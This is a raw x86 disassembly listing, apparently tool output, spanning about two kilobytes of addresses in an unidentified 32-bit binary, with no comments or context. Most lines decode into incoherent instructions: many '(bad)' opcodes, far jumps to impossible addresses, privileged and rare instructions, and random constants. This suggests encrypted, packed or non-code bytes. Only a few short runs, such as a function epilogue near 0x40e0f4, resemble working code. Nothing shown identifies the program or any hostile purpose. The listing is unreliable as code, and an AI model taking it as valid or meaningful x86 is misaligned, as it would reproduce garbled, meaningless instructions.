  40de1e:	ss test al,0xe0
  40de21:	or     eax,0x6dfb5d60
  40de26:	mov    al,0x7d
  40de28:	jmp    0xc95bc78d
  40de2d:	xor    al,dh
  40de2f:	xchg   BYTE PTR [esi+0x7e],bh
  40de32:	aas    
  40de33:	jg     0x40deb3
  40de35:	jle    0x40ddd0
  40de37:	jg     0x40de43
  40de39:	(bad)  
  40de3a:	mov    eax,ds:0xd284b669
  40de3f:	outs   dx,BYTE PTR ds:[esi]
  40de40:	aas    
  40de41:	mov    DWORD PTR [eax-0x7b],eax
  40de44:	test   DWORD PTR [edx-0x12fdff0a],ebx
  40de4a:	jmp    0x658954d0
  40de4f:	call   0xec4:0x802a55
  40de56:	or     al,0xb9
  40de58:	sbb    al,0xc2
  40de5a:	sbb    ebp,ecx
  40de5c:	out    dx,eax
  40de5d:	sub    DWORD PTR [esi],esi
  40de5f:	mov    WORD PTR [edi-0x33],gs
  40de62:	jecxz  0x40dde9
  40de64:	fadd   DWORD PTR [ecx]
  40de66:	ss mov ah,0x3e
  40de69:	and    ecx,DWORD PTR [edi]
  40de6b:	loope  0x40dea7
  40de6d:	push   ss
  40de6e:	xchg   esi,eax
  40de6f:	sub    al,al
  40de71:	mov    ds:0xfc8dc357,eax
  40de76:	inc    esi
  40de77:	push   edi
  40de78:	xor    al,0x84
  40de7a:	ret    
  40de7b:	xchg   edi,eax
  40de7c:	aas    
  40de7d:	(bad)  
  40de7e:	xchg   edi,eax
  40de7f:	(bad)  
  40de81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de82:	mov    ecx,0xdcc5eb86
  40de87:	leave  
  40de88:	sbb    al,0x8b
  40de8a:	lods   eax,DWORD PTR ds:[esi]
  40de8b:	sbb    ch,dl
  40de8d:	in     al,0xba
  40de8f:	lahf   
  40de90:	repz (bad) 
  40de92:	jns    0x40de6c
  40de94:	ins    DWORD PTR es:[edi],dx
  40de95:	sub    al,0x52
  40de97:	shr    BYTE PTR [ebx-0x16e75cf2],1
  40de9d:	jne    0x40de5b
  40de9f:	mov    eax,ds:0x9f1aa06c
  40dea4:	(bad)  
  40dea5:	icebp  
  40dea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dea7:	aam    0x93
  40dea9:	test   eax,0xc449e6e2
  40deae:	cmp    edi,ebx
  40deb0:	xchg   edi,eax
  40deb1:	xor    dh,BYTE PTR [esi]
  40deb3:	retf   0x45ca
  40deb6:	lods   al,BYTE PTR ds:[esi]
  40deb7:	sti    
  40deb8:	neg    BYTE PTR [edi+0x60]
  40debb:	inc    esi
  40debc:	jne    0x40df37
  40debe:	xchg   edx,eax
  40debf:	xchg   BYTE PTR [esi+0x3c],ah
  40dec2:	xlat   BYTE PTR ds:[ebx]
  40dec3:	mov    DWORD PTR [eax-0x7f],edx
  40dec6:	cmp    BYTE PTR [di-0x11],cl
  40deca:	pushf  
  40decb:	add    eax,DWORD PTR [edx-0x34]
  40dece:	leave  
  40decf:	cwde   
  40ded0:	mov    BYTE PTR [ecx-0x23],bh
  40ded3:	inc    ebx
  40ded4:	(bad)  
  40ded5:	jb     0x40dee7
  40ded7:	bound  ebx,QWORD PTR [esi+0x60]
  40deda:	imul   ebp,ecx,0x99728f03
  40dee0:	push   cs
  40dee1:	into   
  40dee2:	sub    eax,0x6d8b40c0
  40dee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dee8:	sahf   
  40dee9:	and    eax,0x2bc1c96b
  40deee:	aam    0xb1
  40def0:	jmp    0x3f52055c
  40def5:	aad    0xb2
  40def7:	or     ecx,DWORD PTR [ebp-0x61]
  40defa:	clc    
  40defb:	(bad)  
  40defc:	cmpxchg BYTE PTR [eax],bl
  40deff:	(bad)  
  40df00:	shl    esi,0x11
  40df03:	scas   al,BYTE PTR es:[edi]
  40df04:	mov    al,ds:0xa115f8f9
  40df09:	lea    ebp,[esi-0x4]
  40df0c:	mov    esp,0x6caf7379
  40df11:	fwait
  40df12:	or     al,0x5c
  40df14:	int3   
  40df15:	sbb    edx,edx
  40df17:	cmp    al,0x1c
  40df19:	xchg   esi,eax
  40df1a:	loop   0x40df04
  40df1c:	ja     0x40df1b
  40df1e:	push   eax
  40df1f:	sub    al,0x83
  40df21:	xchg   ebx,eax
  40df22:	cmp    edx,ecx
  40df24:	and    al,0xdd
  40df26:	imul   esi,edi,0x5492574b
  40df2c:	ja     0x40df45
  40df2e:	imul   ecx,DWORD PTR [ecx],0x7a
  40df31:	sub    al,0x48
  40df33:	aas    
  40df34:	cmp    eax,0x31924c26
  40df39:	mov    edi,0xa876d15f
  40df3e:	dec    eax
  40df3f:	mov    ecx,DWORD PTR [edx+0x63]
  40df42:	loop   0x40dee6
  40df44:	dec    ebx
  40df45:	(bad)  
  40df46:	and    edx,DWORD PTR [ecx]
  40df48:	ins    DWORD PTR es:[edi],dx
  40df49:	xor    al,0x6a
  40df4b:	(bad)  
  40df4c:	fcom   st(2)
  40df4e:	retf   
  40df4f:	dec    ecx
  40df50:	fdivrp st(0),st
  40df52:	pusha  
  40df53:	inc    eax
  40df54:	dec    ecx
  40df55:	(bad)  
  40df56:	aaa    
  40df57:	call   0x32be5fe
  40df5c:	xlat   BYTE PTR ds:[ebx]
  40df5d:	or     al,0xb7
  40df5f:	fild   QWORD PTR [edx+edx*8]
  40df62:	push   esp
  40df63:	sub    BYTE PTR [eax],ch
  40df65:	hlt    
  40df66:	aas    
  40df67:	cmp    eax,0x220d687a
  40df6c:	dec    ebx
  40df6d:	dec    esp
  40df6e:	mov    ds:0x9e0225b0,eax
  40df73:	push   ebp
  40df74:	inc    edx
  40df75:	inc    ah
  40df77:	sub    ebx,ecx
  40df79:	xchg   ebx,ecx
  40df7b:	dec    ecx
  40df7c:	mov    eax,DWORD PTR [ebp-0x1c]
  40df7f:	imul   eax,ecx
  40df82:	add    esp,eax
  40df84:	xchg   edx,eax
  40df85:	push   eax
  40df86:	xor    ebx,ebx
  40df88:	mov    edx,esp
  40df8a:	dec    edx
  40df8b:	inc    ebx
  40df8c:	add    ebx,DWORD PTR [edx+ebx*1]
  40df8f:	dec    ebx
  40df90:	xor    edx,edx
  40df92:	add    DWORD PTR [ebp-0xc],ebx
  40df95:	pop    ebx
  40df96:	jmp    0x40e0f4
  40df9b:	mov    BYTE PTR [eax+0x5d7fc57f],cl
  40dfa1:	pop    esp
  40dfa2:	pop    ebp
  40dfa3:	in     eax,0x25
  40dfa5:	pop    ebp
  40dfa6:	rol    DWORD PTR [ebp-0x785155cd],1
  40dfac:	xchg   DWORD PTR [esi+0x7e],edi
  40dfaf:	aas    
  40dfb0:	jg     0x40e030
  40dfb2:	jle    0x40df74
  40dfb4:	mov    dh,0xec
  40dfb6:	dec    esi
  40dfb7:	gs xchg esp,eax
  40dfb9:	mov    cl,0xe6
  40dfbc:	pushf  
  40dfbd:	int3   
  40dfbe:	fdivr  DWORD PTR [eax]
  40dfc0:	dec    esi
  40dfc1:	mov    esp,0x3bd74586
  40dfc6:	mov    BYTE PTR [edx+esi*1+0x18ae1cfa],ah
  40dfcd:	dec    esi
  40dfce:	push   es
  40dfcf:	sbb    al,0xb7
  40dfd1:	in     al,0x29
  40dfd3:	pop    ebp
  40dfd4:	cld    
  40dfd5:	inc    esi
  40dfd6:	or     bl,ch
  40dfd8:	nop    DWORD PTR [edi-0x34e09f0c]
  40dfdf:	ins    BYTE PTR es:[edi],dx
  40dfe0:	jmp    0x40e034
  40dfe2:	jnp    0x40dff4
  40dfe4:	dec    esp
  40dfe5:	adc    ebx,DWORD PTR [ebx+0x67]
  40dfe8:	xor    eax,0xc3aa2bea
  40dfed:	sbb    cl,BYTE PTR [edx-0x6d5ee91d]
  40dff3:	in     al,0x63
  40dff5:	jg     0x40dff1
  40dff7:	mov    ebx,0x5ec19521
  40dffc:	scas   al,BYTE PTR es:[edi]
  40dffd:	cmc    
  40dffe:	fldenv [ebx]
  40e000:	cwde   
  40e001:	push   cs
  40e002:	les    esp,FWORD PTR [eax+0x5876c241]
  40e008:	in     eax,0xaf
  40e00a:	popa   
  40e00b:	pushf  
  40e00c:	adc    ah,cl
  40e00e:	jecxz  0x40dff5
  40e010:	repnz ss cs and eax,0x972c88e4
  40e018:	xor    eax,0x75c6e7a6
  40e01e:	jno    0x40e029
  40e020:	jns    0x40dfb2
  40e022:	add    esi,edx
  40e024:	shl    dl,1
  40e026:	ret    
  40e027:	inc    edx
  40e028:	sbb    edi,0xfffffff4
  40e02b:	btc    DWORD PTR [edx-0x62c895d5],ebp
  40e032:	rcl    DWORD PTR [ebx],0xcb
  40e035:	jp     0x40e073
  40e037:	(bad)  
  40e038:	jo     0x40e02d
  40e03a:	pop    esi
  40e03b:	adc    al,0xab
  40e03d:	(bad)  
  40e03f:	repz dec esi
  40e041:	pop    edi
  40e042:	cmp    ebp,DWORD PTR [edi+0x247fa9d7]
  40e048:	add    DWORD PTR [edi+0x4728a03b],eax
  40e04e:	rol    ebp,1
  40e050:	and    al,BYTE PTR [ecx]
  40e052:	shl    eax,1
  40e054:	cmc    
  40e055:	pop    ebx
  40e056:	cmc    
  40e057:	dec    ebx
  40e058:	jns    0x40e09b
  40e05a:	aad    0xab
  40e05c:	frstor [edi-0x13]
  40e05f:	shl    bl,1
  40e061:	cmp    edi,edx
  40e063:	inc    ecx
  40e064:	(bad)  
  40e065:	fcomp  DWORD PTR [ebx+0x5a3ec9d2]
  40e06b:	xchg   esp,eax
  40e06c:	lahf   
  40e06d:	jmp    0x40dff4
  40e06f:	xlat   BYTE PTR ds:[ebx]
  40e070:	ficom  WORD PTR [ecx-0x3d]
  40e073:	mov    ebx,0x17c2dc75
  40e078:	lock test DWORD PTR [edi+ebp*1],esp
  40e07c:	xchg   esi,eax
  40e07d:	icebp  
  40e07e:	(bad)  
  40e07f:	(bad)  
  40e080:	mov    al,0x3c
  40e082:	inc    eax
  40e083:	adc    BYTE PTR [eax+0x1a5b76ab],dh
  40e089:	push   edx
  40e08a:	imul   bl
  40e08c:	push   eax
  40e08d:	push   ebx
  40e08e:	xor    eax,0xd0140d45
  40e093:	jb     0x40e0cc
  40e095:	jnp    0x40e038
  40e097:	pop    esi
  40e098:	push   ss
  40e099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e09a:	and    BYTE PTR [ebx-0x37],ch
  40e09d:	inc    cl
  40e09f:	sar    BYTE PTR [bx+si-0x2323],cl
  40e0a4:	ds out 0xbe,al
  40e0a7:	pushf  
  40e0a8:	(bad)
  40e0ad:	xor    cl,bh
  40e0af:	mov    ds:0xef60f82a,eax
  40e0b4:	outs   dx,DWORD PTR ds:[esi]
  40e0b5:	stos   BYTE PTR es:[edi],al
  40e0b6:	call   0x566fd27c
  40e0bb:	jecxz  0x40e094
  40e0bd:	sti    
  40e0be:	dec    ecx
  40e0bf:	mov    bl,0x37
  40e0c1:	adc    BYTE PTR [ecx+ebp*2-0x4b74b8fa],dh
  40e0c8:	xor    bh,BYTE PTR [edi-0x549c00d]
  40e0ce:	jle    0x40e059
  40e0d0:	aas    
  40e0d1:	shl    DWORD PTR [ebp+0xc],0x6e
  40e0d5:	inc    eax
  40e0d6:	sahf   
  40e0d7:	adc    ch,BYTE PTR [edx-0xd28c9bc]
  40e0dd:	push   ss
  40e0de:	in     al,dx
  40e0df:	or     eax,0x103b6683
  40e0e4:	ret    
  40e0e5:	mov    eax,0x662ab611
  40e0ea:	mov    edi,0x968d3c5f
  40e0ef:	fs inc esp
  40e0f1:	adc    al,0xaa
  40e0f3:	int3   
  40e0f4:	mov    eax,DWORD PTR [ebp-0xc]
  40e0f7:	pop    edi
  40e0f8:	pop    esi
  40e0f9:	pop    ebx
  40e0fa:	leave  
  40e0fb:	ret    0x10
  40e0fe:	dec    ebp
  40e0ff:	push   ebp
  40e100:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40e106:	mov    esp,ebp
  40e108:	or     ah,dh
  40e10a:	dec    ebp
  40e10b:	add    bh,al
  40e10d:	add    BYTE PTR [eax],cl
  40e10f:	add    BYTE PTR [eax],al
  40e111:	mov    DWORD PTR [eax],0x40f44545
  40e117:	xor    eax,0x9c8b8500
  40e11c:	hlt    
  40e11d:	clc    
  40e11e:	retf   
  40e11f:	(bad)  
  40e120:	enter  0x4d45,0xbc
  40e124:	mov    esi,DWORD PTR [edx]
  40e126:	hlt    
  40e127:	test   ebx,ecx
  40e129:	pushf  
  40e12a:	enter  0x4df8,0x8b
  40e12e:	mov    DWORD PTR [ebp-0x20],0x890208
  40e135:	inc    ebp
  40e136:	inc    ebp
  40e137:	cld    
  40e138:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e13e:	or     BYTE PTR [ebx+0x0],dl
  40e141:	mov    ebx,0x8bd5600
  40e146:	call   DWORD PTR [ecx-0x1]
  40e149:	pop    es
  40e14a:	mov    ch,0x33
  40e14c:	dec    ebx
  40e14e:	(bad)  
  40e14f:	mov    eax,0x72009da4
  40e154:	push   DWORD PTR [edx]
  40e156:	or     BYTE PTR [eax],al
  40e158:	jmp    0xff89:0x75c84d03
  40e15f:	dec    ebp
  40e160:	loopne 0x40e132
  40e162:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e168:	add    BYTE PTR [ebx],dh
  40e16a:	mov    ecx,ebx
  40e16c:	hlt    
  40e16d:	add    ecx,ebx
  40e16f:	enter  0x899d,0x32
  40e173:	dec    ebp
  40e174:	add    ecx,eax
  40e176:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e17c:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e183:	xor    ecx,ebx
  40e185:	retf   
  40e186:	enter  0x4d03,0xc8
  40e18a:	mov    DWORD PTR fs:[eax],ebx
  40e18d:	lea    eax,[eax]
  40e18f:	push   esp
  40e190:	mov    edi,edi
  40e192:	fs (bad) 
  40e194:	(bad)  
  40e195:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e19b:	push   0xffffffff
  40e19d:	and    bh,bh
  40e19f:	pop    ecx
  40e1a0:	inc    eax
  40e1a1:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e1a7:	push   0xffffff8b
  40e1a9:	pop    ecx
  40e1aa:	cld    
  40e1ab:	dec    ebp
  40e1ac:	lea    ecx,[ecx+0x45ff08ff]
  40e1b2:	mov    BYTE PTR [edx+0x1],cl
  40e1b5:	add    BYTE PTR [eax],al
  40e1b7:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e1be:	dec    DWORD PTR [ebp-0x77]
  40e1c1:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e1c8:	cld    
  40e1c9:	dec    ebp
  40e1ca:	jne    0x40e1ff
  40e1cc:	lea    eax,[ebx]
  40e1ce:	push   eax
  40e1cf:	mov    edi,edi
  40e1d1:	or     BYTE PTR [ecx+0x54a845],cl
  40e1d7:	add    al,ch
  40e1d9:	(bad)  
  40e1da:	sub    esp,ebp
  40e1dc:	add    BYTE PTR [eax],al
  40e1de:	rol    BYTE PTR [eax],0x84
  40e1e1:	inc    ebp
  40e1e2:	add    dh,BYTE PTR [esi+0x0]
  40e1e5:	add    BYTE PTR [ebp-0x73],al
  40e1e8:	mov    ebp,DWORD PTR [esp+edx*4]
  40e1eb:	inc    DWORD PTR [eax]
  40e1ed:	lea    ecx,[ebx-0x30074f4]
  40e1f3:	call   0x41ed78
  40e1f8:	add    BYTE PTR [ebp+0x0],cl
  40e1fb:	jne    0x40e23e
  40e1fd:	dec    DWORD PTR [ebx-0x76210314]
  40e203:	dec    ebp
  40e204:	add    DWORD PTR [ebp+0x0],esi
  40e207:	(bad)  
  40e208:	xchg   ebp,eax
  40e209:	loopne 0x40e20a
  40e20b:	inc    eax
  40e20c:	inc    DWORD PTR [eax]
  40e20e:	mov    ecx,DWORD PTR [ebp-0x4]
  40e211:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e217:	add    BYTE PTR [edx],dl
  40e219:	enter  0x4d90,0x0
  40e21d:	mov    eax,DWORD PTR [eax]
  40e21f:	hlt    
  40e220:	add    al,0xa5
  40e222:	mov    al,0xff
  40e224:	add    bh,bh
  40e226:	add    BYTE PTR [ebx],dh
  40e228:	inc    DWORD PTR [ebx]
  40e22a:	sbb    al,0x89
  40e22c:	jne    0x40e206
  40e22e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e234:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e23a:	mov    DWORD PTR [eax-0x70],0xe058e189
  40e241:	inc    DWORD PTR [ebp-0x75]
  40e244:	ror    DWORD PTR [esi+ebp*8],1
  40e247:	test   DWORD PTR [esi-0x1],esp
  40e24a:	inc    ebp
  40e24b:	(bad)  
  40e24c:	aas    
  40e24d:	inc    ebp
  40e24e:	(bad)  
  40e24f:	lea    edi,[esp+eiz*2-0x1]
  40e253:	push   DWORD PTR [edi]
  40e255:	mov    DWORD PTR [ecx],esi
  40e257:	mov    al,ds:0x8b8000c7
  40e25c:	loopne 0x40e25a
  40e25e:	jmp    0xdfff:0xeeff458d
  40e265:	mov    bh,al
  40e267:	add    DWORD PTR [eax-0x1fba1500],ecx
  40e26d:	inc    DWORD PTR [ebp-0x4]
  40e270:	xlat   BYTE PTR ds:[ebx]
  40e271:	lea    edi,[edi]
  40e273:	inc    edi
  40e275:	jmp    FWORD PTR [eax-0x78]
  40e278:	inc    DWORD PTR [ecx]
  40e27a:	aaa    
  40e27b:	add    BYTE PTR [ecx],dh
  40e27d:	repnz mov DWORD PTR [eax],0xfff856c
  40e284:	ffreep st(5)
  40e286:	aas    
  40e287:	add    bh,al
  40e289:	mov    esi,DWORD PTR [eax-0x4]
  40e28c:	inc    DWORD PTR [eax+0xdf01ee]
  40e292:	(bad)  
  40e293:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e297:	mov    esp,ebx
  40e299:	xchg   esp,eax
  40e29a:	rol    DWORD PTR [eax],cl
  40e29c:	(bad)  
  40e29d:	mov    edi,DWORD PTR [eax+0x3]
  40e2a0:	(bad)  
  40e2a1:	cmp    al,0xd7
  40e2a3:	dec    ebp
  40e2a4:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  40e2aa:	add    BYTE PTR [ebp-0x3b375],cl
  40e2b0:	adc    BYTE PTR [edx+0x1],0x55
  40e2b4:	add    BYTE PTR [ebx+0x58c30],cl
  40e2ba:	add    BYTE PTR [ebx-0x778afc7b],cl
  40e2c0:	mov    eax,DWORD PTR [eax]
  40e2c2:	cld    
  40e2c3:	push   0x7d
  40e2c5:	dec    DWORD PTR [ebx+0xd88c]
  40e2cb:	push   edx
  40e2cc:	mov    edx,DWORD PTR [ecx-0x4]
  40e2cf:	call   DWORD PTR [eax+0x7d01fc]
  40e2d5:	mov    esp,DWORD PTR [esp+edi*8]
  40e2d8:	add    BYTE PTR [eax+0x560150],dl
  40e2de:	test   DWORD PTR [ebp+0x75],eax
  40e2e1:	jmp    0x947d:0xc7fce28b
  40e2e8:	mov    ebp,ebx
  40e2ea:	fcom   st(7)
  40e2ec:	add    bh,al
  40e2ee:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e2f4:	add    edi,edi
  40e2f6:	add    bh,bh
  40e2f8:	add    ah,cl
  40e2fa:	add    dh,dl
  40e2fc:	push   eax
  40e2fd:	inc    ebp
  40e2fe:	push   esi
  40e2ff:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e305:	test   BYTE PTR [ebx],dh
  40e307:	(bad)  
  40e308:	add    eax,0x4572cc
  40e30d:	jecxz  0x40e2d0
  40e30f:	rol    DWORD PTR [edi+eax*8-0x2eff73ff],cl
  40e316:	inc    esi
  40e317:	jle    0x40e319
  40e319:	test   edi,eax
  40e31b:	jmp    esp
  40e31d:	inc    DWORD PTR [eax]
  40e31f:	loope  0x40e321
  40e321:	(bad)  
  40e322:	jne    0x40e2a9
  40e324:	mov    edi,edi
  40e326:	cld    
  40e327:	inc    DWORD PTR [ebp-0x20]
  40e32a:	mov    ebp,edx
  40e32c:	mov    ah,0x85
  40e32e:	add    bh,bh
  40e330:	call   0x1170c34
  40e335:	int3   
  40e336:	mov    eax,DWORD PTR [ebp-0x7f0004]
  40e33c:	add    ebx,ebp
  40e33e:	add    al,ah
  40e340:	xor    BYTE PTR [ebp-0xff0085],al
  40e346:	mov    edx,ecx
  40e348:	cld    
  40e349:	jle    0x40e2d4
  40e34b:	push   ebx
  40e34c:	add    DWORD PTR [eax],eax
  40e34e:	add    BYTE PTR [eax+0x1],dl
  40e351:	inc    ebp
  40e352:	inc    ebp
  40e353:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e359:	dec    DWORD PTR [ebx-0x3fd90318]
  40e35f:	add    BYTE PTR [ebp-0xbf0040],dl
  40e365:	inc    ebp
  40e366:	retf   0x8b
  40e369:	cld    
  40e36a:	push   eax
  40e36b:	mov    al,0x45
  40e36d:	add    DWORD PTR [ebx+0x459c00],ecx
  40e373:	mov    edi,edi
  40e375:	mov    eax,0xe80800ff
  40e37a:	inc    ebp
  40e37b:	sub    DWORD PTR [ebx-0x47000400],ecx
  40e381:	add    al,0x1
  40e383:	rol    BYTE PTR [eax],0x1e
  40e386:	jne    0x40e3cd
  40e388:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e38e:	inc    DWORD PTR [ecx]
  40e390:	call   0x860b95
  40e395:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e39b:	call   0x410ca1
  40e3a0:	xor    bh,bh
  40e3a2:	push   edi
  40e3a3:	adc    BYTE PTR [ebx-0x747423bb],al
  40e3a9:	loopne 0x40e387
  40e3ab:	ret    
  40e3ac:	loopne 0x40e34b
  40e3ae:	xor    DWORD PTR [edx],0x31
  40e3b1:	cmp    edi,edi
  40e3b3:	bswap  esp
  40e3b5:	rol    BYTE PTR gs:[eax],0x5
  40e3b9:	jmp    0x12be503
  40e3be:	mov    eax,DWORD PTR [ebp-0x4]
  40e3c1:	add    BYTE PTR [eax+0xff0100],bh
  40e3c7:	cld    
  40e3c8:	jne    0x40e447
  40e3ca:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e3d0:	pusha  
  40e3d1:	add    DWORD PTR [eax],eax
  40e3d3:	add    BYTE PTR [eax-0x37],dl
  40e3d6:	inc    ebp
  40e3d7:	add    BYTE PTR [ebx+0x459850],cl
  40e3dd:	mov    edi,edi
  40e3df:	test   al,0xff
  40e3e1:	add    BYTE PTR [eax],cl
  40e3e3:	inc    DWORD PTR [ebp-0x18]
  40e3e6:	jmp    DWORD PTR ds:0x4d7d00dc
  40e3ec:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e3f2:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e3f8:	popf   
  40e3f9:	mov    eax,0x30132
  40e3fe:	lea    esi,[ebp+0x2c]
  40e401:	xor    edi,edi
  40e403:	(bad)  
  40e404:	call   0x1400c71
  40e409:	call   0x1350c99
  40e40e:	jne    0x40e39b
  40e410:	xor    edi,esp
  40e412:	add    eax,DWORD PTR [eax+0xc018d]
  40e418:	push   DWORD PTR [eax]
  40e41a:	call   0xca0c76
  40e41f:	int3   
  40e420:	inc    DWORD PTR [ebp-0x14]
  40e423:	mov    ecx,DWORD PTR [ebp-0x28]
  40e426:	xor    eax,DWORD PTR [eax]
  40e428:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e42e:	(bad)  
  40e42f:	xchg   ebp,eax
  40e430:	in     al,0xff
  40e432:	add    bh,bh
  40e434:	add    BYTE PTR [edi+0x508b0045],bl
  40e43a:	or     BYTE PTR [ebp-0x3d],al
  40e43d:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff63]
  40e444:	mov    edi,edi
  40e446:	or     BYTE PTR [eax],cl
  40e448:	inc    ebp
  40e449:	test   DWORD PTR gs:[eax],eax
  40e44c:	je     0x40e493
  40e44e:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e454:	xor    edx,DWORD PTR [eax-0x73]
  40e457:	push   ebp
  40e458:	or     BYTE PTR [ebp+0x21007572],al
  40e45e:	inc    ebp
  40e45f:	in     al,dx
  40e460:	mov    ebp,DWORD PTR [eax]
  40e462:	mov    esp,0x638bc345
  40e467:	fmul   st,st(5)
  40e469:	add    BYTE PTR [ebx],ch
  40e46b:	mov    eax,DWORD PTR [ebx]
  40e46d:	cld    
  40e46e:	loopne 0x40e430
  40e470:	inc    ebp
  40e471:	push   ebp
  40e472:	cmp    ebp,eax
  40e474:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e47b:	cld    
  40e47c:	fadd   DWORD PTR [eax+0x3b014d]
  40e482:	jne    0x40e4b4
  40e484:	push   0xf8898557
  40e489:	in     al,dx
  40e48a:	jne    0x40e4d1
  40e48c:	lea    eax,[ebx+0x72e8dcc8]
  40e492:	xor    BYTE PTR [ebx+0x7545bc00],cl
  40e498:	jmp    0x40e4cd
  40e49a:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e4a0:	xor    eax,edi
  40e4a2:	adc    DWORD PTR [ebp-0xcd0063],0x8b2b31
  40e4ac:	rcl    BYTE PTR [eax-0x40],1
  40e4af:	inc    ebp
  40e4b0:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e4b8:	inc    ebp
  40e4b9:	xchg   ebp,eax
  40e4ba:	ud0    ebp,DWORD PTR [ebx]
  40e4bd:	inc    DWORD PTR [eax]
  40e4bf:	adc    eax,0x508a0076
  40e4c4:	adc    BYTE PTR [ebp+0x1f],0x8b
  40e4c8:	or     al,0xf4
  40e4ca:	inc    eax
  40e4cb:	retf   
  40e4cc:	inc    ebp
  40e4cd:	iret   
  40e4ce:	jb     0x40e498
  40e4d0:	mov    eax,DWORD PTR [edi]
  40e4d2:	enter  0x4545,0x1
  40e4d6:	xor    eax,0x898b9c00
  40e4db:	mov    esp,0x33324df0
  40e4e0:	pushf  
  40e4e1:	lea    ecx,[ecx+0x4d72e008]
  40e4e7:	add    BYTE PTR [ebx],dh
  40e4e9:	inc    ebp
  40e4ea:	mov    DWORD PTR [ebx-0x3f621b4c],ecx
  40e4f0:	xor    dl,BYTE PTR [edx]
  40e4f2:	add    eax,DWORD PTR [ebp-0x77]
  40e4f5:	mov    eax,esp
  40e4f7:	fmul   DWORD PTR [ebp-0x3d]
  40e4fa:	xor    eax,DWORD PTR [ebx+eax*1+0x832899d]
  40e501:	mov    DWORD PTR [ebp-0x28],eax
  40e504:	aad    0x45
  40e506:	pushf  
  40e507:	xor    eax,edi
  40e509:	mov    ecx,0xff858db0
  40e50e:	clc    
  40e50f:	enter  0x4d45,0x30
  40e513:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e51a:	test   esi,edi
  40e51c:	clc    
  40e51d:	inc    DWORD PTR [ebp+0x45]
  40e520:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e528:	test   DWORD PTR ds:0xff459cf8,esi
  40e52e:	cmp    al,0xfc
  40e530:	pushf  
  40e531:	inc    ebp
  40e532:	mov    edx,DWORD PTR [eax-0x28]
  40e535:	popf   
  40e536:	push   ebp
  40e537:	add    BYTE PTR [ebx],dh
  40e539:	mov    DWORD PTR [ebx],eax
  40e53b:	sar    BYTE PTR [ebx],1
  40e53d:	adc    BYTE PTR [edi],cl
  40e53f:	dec    ebp
  40e540:	adc    al,0x8b
  40e542:	add    al,dl
  40e544:	jmp    0x101e714
  40e549:	jb     0x40e598
  40e54b:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e551:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e554:	xor    ecx,DWORD PTR [edi]
  40e556:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e55a:	(bad)  
  40e55c:	clc    
  40e55d:	enter  0x8400,0x8b
  40e561:	pop    es
  40e562:	mov    al,0x0
  40e564:	push   ebp
  40e565:	push   cs
  40e566:	xor    ecx,eax
  40e568:	xor    esp,ecx
  40e56a:	add    ebp,DWORD PTR [eax]
  40e56c:	add    esi,DWORD PTR [eax]
  40e56e:	(bad)  
  40e570:	retf   0x55c8
  40e573:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e577:	(bad)  
  40e578:	cli    
  40e579:	fdivr  st,st(1)
  40e57b:	test   DWORD PTR [eax+edi*8],ecx
  40e57e:	dec    ebp
  40e57f:	inc    ebp
  40e580:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e586:	add    BYTE PTR [ebp+0x0],al
  40e589:	mov    ecx,DWORD PTR [ebp-0x28]
  40e58c:	mov    ecx,ebx
  40e58e:	clc    
  40e58f:	jne    0x40e55c
  40e591:	mov    esi,0xd672d3
  40e596:	into   
  40e597:	into   
  40e598:	scas   eax,DWORD PTR es:[edi]
  40e599:	dec    ebp
  40e59a:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e5a0:	sub    ecx,esi
  40e5a2:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e5a5:	(bad)  
  40e5a6:	mov    edi,eax
  40e5a8:	mov    al,0x85
  40e5aa:	mov    eax,edi
  40e5ac:	add    BYTE PTR [ebp-0x75],al
  40e5af:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e5b6:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e5bc:	rdtsc  
  40e5be:	retf   0x559c
  40e5c1:	(bad)  
  40e5c2:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e5c9:	inc    ebp
  40e5ca:	add    eax,0xeb9c4d3f
  40e5cf:	(bad)  
  40e5d0:	mov    ecx,esp
  40e5d2:	lods   al,BYTE PTR ds:[esi]
  40e5d3:	test   DWORD PTR [ebp-0x8],edx
  40e5d6:	xor    ecx,DWORD PTR [ebp+0x33]
